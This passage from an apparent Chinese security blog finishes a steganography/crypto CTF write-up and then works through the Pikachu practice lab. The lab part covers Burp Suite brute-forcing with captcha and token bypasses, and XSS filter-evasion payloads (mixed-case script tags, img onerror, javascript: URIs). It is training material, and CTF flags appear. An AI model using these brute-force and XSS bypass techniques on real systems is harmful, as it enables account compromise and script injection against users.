operator">-</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">j</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">GG</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">end</span><span class="token keyword">end</span>figure<span class="token punctuation">,</span><span class="token function">imshow</span><span class="token punctuation">(</span>GG<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">title</span><span class="token punctuation">(</span><span class="token string">'extracted watermark'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">imwrite</span><span class="token punctuation">(</span><span class="token function">uint8</span><span class="token punctuation">(</span>GG<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'extracted watermark.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag就在解出来的图片里</p><p>flag{c93fd2a3-103f-4539-9a51-ad5a6437daa1}</p><h2 id="2019-nCoV"><a href="#2019-nCoV" class="headerlink" title="2019-nCoV"></a>2019-nCoV</h2><p>后面放了一个提示</p><pre class="line-numbers language-none"><code class="language-none">NB2HI4B2F4XXO53XFZWWK4TSPFRGS3ZOMNXW2LTDNYXWE3DPM4XVGQKSKMWUG32WFUZC2Z3FNZXW22LDFVQW4YLMPFZWS4ZONB2G23AKNB2HI4DTHIXS653XO4XG4Y3CNEXG43DNFZXGS2BOM5XXML3POJTGM2LOMRSXELYKNB2HI4B2F4XXO53XFZWWK4TSPFRGS3ZOMNXW2LTDNYXWE3DPM4XWG33SN5XGC5TJOJ2XGLLJNZ2HE33EOVRXI2LPNYXGQ5DNNQFAUUDMMVQXGZJANZXXI2LDMUQFI2DFEBWGC4THMVZXIIDTORZHKY3UOVZGC3BAOBZG65DFNFXCAIAKORUGKIDQMFZXG53POJSCA2LTEB2GQZJAEBWWINJINF2CO4ZAM5SW4ZJAONSXC5LFNZRWKKJAMFXGIIDEN4QG433UEBWGK5BAORUGKIHCQCMFY3XCQCMSA2LOEBWWINJIFE&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>base32解码：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;www.merrybio.com.cn&#x2F;blog&#x2F;SARS-CoV-2-genomic-analysis.htmlhttps:&#x2F;&#x2F;www.ncbi.nlm.nih.gov&#x2F;orffinder&#x2F;http:&#x2F;&#x2F;www.merrybio.com.cn&#x2F;blog&#x2F;coronavirus-introduction.htmlPlease notice The largest structural protein  the password is the  md5(it&#39;s gene sequence) and do not let the ‘\n’ in md5()注意最大的结构蛋白，密码是基因序列的md5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>给了几个网址让我去里面找线索</p><p>直接ctrl+F找最大的结构蛋白</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208194455739.png" alt="image-20210208194455739"></p><p>找到基因结构</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208211243378.png" alt="image-20210208211243378"></p><p>接着去那个政府网站找到它的全基因组序列（MN908947）</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208194508194.png" alt="image-20210208194508194"></p><p>根据提示，计算它们的md5</p><p>md5:98eb1b1760bcc837934c8695a1cee923</p><p>拿MP3stego 解开 cov.mp3</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">MP3StegoDecode.exe -X -P 98eb1b1760bcc837934c8695a1cee923 cov.mp3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到一个压缩包 realflag.zip  密码为 2019-nCoV</p><p>解压之后有提示2和一张图片</p><pre class="line-numbers language-none"><code class="language-none">796f75206d7573742070617920617474656e74696f6e20746f204e2070726f7465696e202c486f7720646f20746861742067657420696e746f2074686520766972616c206361707369643f0a646f20796f75206b6e6f772073746567686964653f0a7468652070617373776f726420697320656e637279707420627920566967656ec3a87265204369706865720a74686520736372656374206b65792069732054686520746f702032302063686172616374657273207769746820746865206d6f7374206f6363757272656e6365732061726520636f756e7465642b434f4d424154<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个base16转码：</p><pre class="line-numbers language-none"><code class="language-none">you must pay attention to N protein ,How do that get into the viral capsid? 核衣壳蛋白（nucleoprotein，N），它如何进入病毒衣壳内？do you know steghide? the password is encrypt by Vigenère Cipher the screct key is The top 20 characters with the most occurrences are counted+COMBAT<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>回到那个网站</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208211301543.png" alt="image-20210208211301543"></p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208194530587.png" alt="image-20210208194530587"></p><p>把这三个蛋白放到一起</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208194550278.png" alt="image-20210208194550278"></p><p>根据hint2,找到这个基因组序列中出现次数最多的20个字符</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token triple-quoted-string string">"""MSDNGPQNQRNAPRITFGGPSDSTGSNQNGERSGARSKQRRPQGLPNNTA SWFTALTQHGKEDLKFPRGQGVPINTNSSPDDQIGYYRRATRRIRGGDGK MKDLSPRWYFYYLGTGPEAGLPYGANKDGIIWVATEGALNTPKDHIGTRN PANNAAIVLQLPQGTTLPKGFYAEGSRGGSQASSRSSSRSRNSSRNSTPG SSRGTSPARMAGNGGDAALALLLLDRLNQLESKMSGKGQQQQGQTVTKKS AAEASKKPRQKRTATKAYNVTQAFGRRGPEQTQGNFGDQELIRQGTDYKH WPQIAQFAPSASAFFGMSRIGMEVTPSGTWLTYTGAIKLDDKDPNFKDQV ILLNKHIDAYKTFPPTEPKKDKKKKADETQALPQRQKKQQTVTLLPAADL DDFSKQLQQSMSSADSTQA MADSNGTITVEELKKLLEQWNLVIGFLFLTWICLLQFAYANRNRFLYIIK LIFLWLLWPVTLACFVLAAVYRINWITGGIAIAMACLVGLMWLSYFIASF RLFARTRSMWSFNPETNILLNVPLHGTILTRPLLESELVIGAVILRGHLR IAGHHLGRCDIKDLPKEITVATSRTLSYYKLGASQRVAGDSGFAAYSRYR IGNYKLNTDHSSSSDNIALLVQ MFHLVDFQVTIAEILLIIMRTFKVSIWNLDYIINLIIKNLSKSLTENKYS QLDEEQPMEID"""</span> s <span class="token operator">=</span> s<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span> d <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>     <span class="token keyword">if</span> i <span class="token keyword">not</span> <span class="token keyword">in</span> d<span class="token punctuation">:</span> d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>         <span class="token keyword">else</span><span class="token punctuation">:</span> d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span>             <span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span>              l <span class="token operator">=</span> <span class="token builtin">sorted</span><span class="token punctuation">(</span>d<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token operator">=</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> reverse<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>             <span class="token keyword">print</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span>             r<span class="token operator">=</span><span class="token string">''</span>             <span class="token keyword">for</span> i <span class="token keyword">in</span> l<span class="token punctuation">:</span>                 r <span class="token operator">+=</span> i<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>                 <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>解出来后是这个：<code>LGASTRIQKNDPFEVYMWHC</code></p><p>根据提示最后还要+COMBAT</p><p>用 SilentEye 对 pass.wav 解密</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208194612346.png" alt="image-20210208194612346"></p><p>得到 password <code>priebeijoarkjpxmdkucxwdus</code></p><p>提示说是维吉尼亚加密</p><p>拿<code>LGASTRIQKNDPFEVYMWHC</code>解密刚刚解出来的password</p><p>final_password=<code>eliminatenovelcoronavirts</code></p><p>最后用这个密码去 steghide 解图片就可以拿到flag了😭</p><p>flag{we_will_over_come_SARS-COV}</p><p><a href="https://ha1c9on.top/2021/01/31/2021-cqb-write-up/#F">参考链接</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pikachu</title>
      <link href="2021/ba-chang/pikachu/"/>
      <url>2021/ba-chang/pikachu/</url>
      
        <content type="html"><![CDATA[<h2 id="Burte-Force（暴力破解）"><a href="#Burte-Force（暴力破解）" class="headerlink" title="Burte Force（暴力破解）"></a>Burte Force（暴力破解）</h2><blockquote><p>“暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。        </p><p>理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。这里的认证安全策略, 包括：</p><p>1.是否要求用户设置复杂的密码；<br>2.是否每次认证都使用安全的验证码（想想你买火车票时输的验证码～）或者手机otp；<br>3.是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等）；<br>4.是否采用了双因素认证；<br>    …等等。</p></blockquote><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>既然是爆破，比较好用的工具就是BurpSuite了</p><p>自己虽说会用一点，但没有系统的去学过它的爆破模块，现在正好好好学一下</p><p>在BurpSuite中，一共有四种爆破模式可供选择，它们的翻译也挺好玩的</p><table><thead><tr><th>Module</th><th>Feature</th></tr></thead><tbody><tr><td>Sniper（狙击手）</td><td>顾名思义，只能像狙击手一样一枪一枪打，一般只设置一个爆破点</td></tr><tr><td>Battering ram（攻城锤）</td><td>和狙击手差不多，但可以二连发，一个payload同时打两个爆破点</td></tr><tr><td>Pitchfork（叉子）</td><td>根据设置的变量的个数来选择payload(&gt;1)，如果两个payload数量不一样一般取它们的交集</td></tr><tr><td>Cluster bomb（集束炸弹）</td><td>和叉子一样，payload&gt;1,并对payload取笛卡尔积去爆破</td></tr></tbody></table><p>从网上找来几张图以便加深理解</p><p>Sniper</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210209115444395.png"></p><p>Battering ram</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210209115552506.png"></p><p>Pitchfork</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210209115634697.png"></p><p>Cluster bomb</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210209115711954.png"></p><h3 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h3><p>很简单，抓包使用cluster bomb模式爆破</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210209120610439.png"></p><h3 id="验证码绕过（on-server）"><a href="#验证码绕过（on-server）" class="headerlink" title="验证码绕过（on server）"></a>验证码绕过（on server）</h3><p>丢到Repeater里去试试，发现登录过后的验证码在一段时间内不会过期，依然可以像上次那样直接爆破</p><p>在输入一次验证码抓包后就一直可以用原来的验证码爆破，验证码相当于摆设</p><p>为什么会这样子呢？查略资料发现是由于登录之后服务端session值没有更新造成的</p><p>参考：<a href="https://cloud.tencent.com/developer/article/1736946">https://cloud.tencent.com/developer/article/1736946</a></p><h3 id="验证码绕过（on-client）"><a href="#验证码绕过（on-client）" class="headerlink" title="验证码绕过（on client）"></a>验证码绕过（on client）</h3><p>客户端的验证码，先看看js代码</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210209151720123.png"></p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210209151344153.png"></p><p>直接删了，接下来就和前面一样了</p><h3 id="token防爆破"><a href="#token防爆破" class="headerlink" title="token防爆破"></a>token防爆破</h3><p><strong>概述</strong></p><blockquote><p>token的意思是“令牌”，是服务端生成的一串字符串，作为客户端进行请求的一个标识。</p><p>当用户第一次登录后，服务器生成一个token并将此token返回给客户端，以后客户端只需带上这个token前来请求数据即可，无需再次带上用户名和密码。</p><p>简单token的组成；uid(用户唯一的身份标识)、time(当前时间的时间戳)、sign（签名，token的前几位以哈希算法压缩成的一定长度的十六进制字符串。为防止token泄露）。</p></blockquote><p>不管它，先抓个包看看</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210209152533123.png"></p><p>随便试一下发现这个token每次都会刷新，所以只能舍掉一个变量了，因为知道admin是其中一个账号，所以去掉username</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210209153215122.png"></p><p>设置好爆破点后，在option中添加正则提取</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210209154209517.png"></p><p>找到要爆破的token就可以了</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210209154427227.png"></p><p>第二个爆破点的设置为递归搜索，把找到的token贴到下面去</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210209155727378.png"></p><p>填好后还有几点需要修改</p><p>一是每次返回的token都是不一样的，所以线程不能多开，只能设置为1</p><p>还有一个就是要把重定向设为一直开着，我一开始没开出问题了，后面看了别人做的才知道要开这个(原因是不开的话就打不开html的body，而token是在body里面的，打不开就不能每次自动获取token了)</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210209155214778.png"></p><p>结果：</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210209155943842.png"></p><h2 id="XSS（跨站脚本）"><a href="#XSS（跨站脚本）" class="headerlink" title="XSS（跨站脚本）"></a>XSS（跨站脚本）</h2><blockquote><p>Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写”CSS”冲突，故又称XSS。一般XSS可以分为如下几种常见类型：</p><p>反射性XSS;</p><p>存储型XSS;</p><p>DOM型XSS;</p><p>XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。<br>XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。<br>形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。<br>因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理:<br><strong>输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;</strong><br><strong>输出转义：根据输出点的位置对输出到前端的内容进行适当转义;</strong></p></blockquote><h3 id="反射型xss-get"><a href="#反射型xss-get" class="headerlink" title="反射型xss(get)"></a>反射型xss(get)</h3><p>先弹个js看看</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210209161457880.png"></p><p>发现限制了字符数</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210209162036377.png"></p><p>改大点</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210209162320605.png"></p><h3 id="反射型xss-post"><a href="#反射型xss-post" class="headerlink" title="反射型xss(post)"></a>反射型xss(post)</h3><p>登录进去就可以正常提交</p><h3 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h3><p><strong>原理</strong></p><blockquote><p>存储型xss是在后台数据库里，如果刷新了，留言列表会从数据库重新提取出xss数据弹框</p></blockquote><h3 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h3><p>提交后只有一个超链接，检查代码后发先指向自己写的语句</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimgimage-20210209163558220.png"></p><p>先了解一下什么是DOM（文档对象模型）</p><blockquote><p>DOM是一种文档对象模型，同时也是用于html编程的接口，通过dom来操作页面中的元素。当html页面被实现加载的时候，浏览器会创建一个DOM，给文档提供了一种新的逻辑结构，并且可以改变内容和结构。</p><p>DOM是面向对象，并且定义了修改文档所需要的对象，各个对象之前的关系，我们可以也页面上的DOM看成一个树状结构，通过js，对html文档进行添加排版，js要想访问html中的元素，就要通过对象模型来获得。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210209202621325.png"></p><p>审查源码</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">domxss</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token keyword">var</span> str <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"text"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>   document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"dom"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"&lt;a href='"</span><span class="token operator">+</span>str<span class="token operator">+</span><span class="token string">"'>what do you see?&lt;/a>"</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token comment">//试试：'>&lt;img src="#" onmouseover="alert('xss')"></span><span class="token comment">//试试：' onclick="alert('xss')">,闭合掉就行</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们输入的str被domxss这个函数执行，getElementById 获取到了标签 id 为 text 的内容赋值给str，然后又把 str 的内容通过字符串拼接的方式写到了 a 标签的 href 属性中，a标签会写到 id 为 dom的 div 标签中。</p><p>源码给了我们提示，只需要闭合前面的，我们后面的就能正常执行了</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">payload1：<span class="token string">'>&lt;img src="#" onmouseover="alert('</span>hello'<span class="token punctuation">)</span>"<span class="token operator">></span>payload2<span class="token operator">:</span><span class="token string">' onclick="alert('</span>hello'<span class="token punctuation">)</span>"<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="DOM型xss-x"><a href="#DOM型xss-x" class="headerlink" title="DOM型xss-x"></a>DOM型xss-x</h3><p>同样的审查源码</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">domxss</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token keyword">var</span> str <span class="token operator">=</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">;</span>   <span class="token keyword">var</span> txss <span class="token operator">=</span> <span class="token function">decodeURIComponent</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"text="</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">var</span> xss <span class="token operator">=</span> txss<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\+</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// alert(xss);</span>  document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"dom"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"&lt;a href='"</span><span class="token operator">+</span>xss<span class="token operator">+</span><span class="token string">"'>就让往事都随风,都随风吧&lt;/a>"</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span><span class="token comment">//试试：'>&lt;img src="#" onmouseover="alert('xss')"></span><span class="token comment">//试试：' onclick="alert('xss')">,闭合掉就行     </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload和上面一样，把构造闭合语句就行</p><p>与前面的不同它是从浏览器URL中获取输入的。 <code>window.location.search</code> 获取URL的内容，再赋值给 str ，经过URL解码和字符串分隔，取出URL中的参数内容，再把 +替换为空格，赋值给 xss，最后把 xss 拼接到 a 标签中，然后写到 id 为 dom 的 div 标签中</p><h3 id="xss之盲打"><a href="#xss之盲打" class="headerlink" title="xss之盲打"></a>xss之盲打</h3><blockquote><p>乱打，能插xss语句都插上，只有后台管理员才能看到</p></blockquote><p>根据提示，登录留言后台</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210209205443889.png"></p><h3 id="xss之过滤"><a href="#xss之过滤" class="headerlink" title="xss之过滤"></a>xss之过滤</h3><blockquote><p>几种常见的绕过方法总结：</p><p>1.前端js限制</p><p>2.大小写绕过</p><p>3.双写绕过</p><p>4.加注释混淆</p><p>5.换编码</p></blockquote><p>先试试看会过滤什么</p><p>输入个<code>&lt;script&gt;alert(&quot;人生苦短&quot;)&lt;/script&gt;</code></p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210209205913092.png"></p><p>直接和它说<code>人生苦短</code></p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210209210055468.png"></p><p>有可能是过滤掉了script中间的内容</p><p>想到php的过滤，先试试混个大小写能不能绕过</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>SCRiPT<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"人生苦短"</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>SCRIpT<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>果然可以</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210209210646835.png"></p><p>百度一下xss绕过姿势，发现还有许多的方法可以绕过过滤</p><p>这题还可以使用img标签来绕过</p><pre class="line-numbers language-none"><code class="language-none">payloads:&lt;img src&#x3D;x onerror&#x3D;&quot;window[&#39;al&#39;+&#39;ert&#39;](AAAAA)&quot;&gt;&lt;&#x2F;img&gt;&lt;img src&#x3D;x onerror&#x3D;&quot;window.alert(AAAAA)&quot;&gt;&lt;&#x2F;img&gt;&lt;img src&#x3D;x onerror&#x3D;&quot;top[&#39;al&#39;+&#39;ert&#39;](AAAAA)&quot;&gt;&lt;&#x2F;img&gt;&lt;img src&#x3D;x onerror&#x3D;&quot;top.alert(AAAAA)&quot;&gt;&lt;&#x2F;img&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="xss之htmlspecialchars"><a href="#xss之htmlspecialchars" class="headerlink" title="xss之htmlspecialchars"></a>xss之htmlspecialchars</h3><blockquote><p>htmlspecialchars — 将特殊字符转换为 HTML 实体</p><p>预定义的字符是<br>&amp; 成为 &amp;amp<br>“ 成为 &amp;quot<br>‘ 成为 &amp;#039<br>&lt; 成为 &amp;lt<br>可用引号类型<br>ENT_COMPAT：默认，仅编码双引号<br>ENT_QUOTES：编码双引号和单引号<br>ENT_NOQUOTES：不编码任何引号</p></blockquote><pre class="line-numbers language-none"><code class="language-none">输几个预定义字符看看&#39;&quot;&lt;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210211085207658.png"></p><p>把href拼接掉弹个框试试</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">#<span class="token string">' onclick=alert('</span>冲冲冲<span class="token string">') '</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在源码可以看到，闭合了href同时点击事件也被加了进去</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210211090013242.png"></p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210211085847943.png"></p><h3 id="xss之href输出"><a href="#xss之href输出" class="headerlink" title="xss之href输出"></a>xss之href输出</h3><p>这题有点懵，看了下源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$message</span><span class="token operator">=</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">ENT_QUOTES</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$html</span><span class="token operator">.=</span>"<span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string single-quoted-string">'&#123;$message&#125;'</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>查了一下，发现可以用javascript协议来执行js</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">javascript<span class="token operator">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"这样子啊"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210211091239215.png"></p><p><strong>防御措施：</strong></p><ul><li>输入的时候只允许 http 或 https 开头的协议，才允许输出</li><li>其次再进行htmlspecialchars处理</li></ul><h3 id="xss之js输出"><a href="#xss之js输出" class="headerlink" title="xss之js输出"></a>xss之js输出</h3><p>查看源码</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>    $ms<span class="token operator">=</span><span class="token string">'tmac'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>$ms<span class="token punctuation">.</span>length <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>$ms <span class="token operator">==</span> <span class="token string">'tmac'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#fromjs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token string">'tmac确实厉害,看那小眼神..'</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token comment">//            alert($ms);</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#fromjs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token string">'无论如何不要放弃心中所爱..'</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>get传参给$ms再进行判断，既然是在一个script标签中，可以在传入参数的时候把前一个script标签给它拼接好</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token string">'&lt;/script>&lt;script>alert('</span>Hello<span class="token operator">!</span>'<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="预防"><a href="#预防" class="headerlink" title="预防"></a>预防</h3><ul><li><strong>长度限制</strong></li><li><strong>加验证码</strong></li><li><strong>输入过滤：不允许可能导致XSS攻击的字符输入</strong></li><li><strong>输出转义：根据输出点的位置对输出到前端的内容进行适当转义</strong></li></ul><p>参考：<a href="https://www.cnblogs.com/H4ck3R-XiX/p/12732356.html">绕过xss过滤姿势总结</a></p><p>​            <a 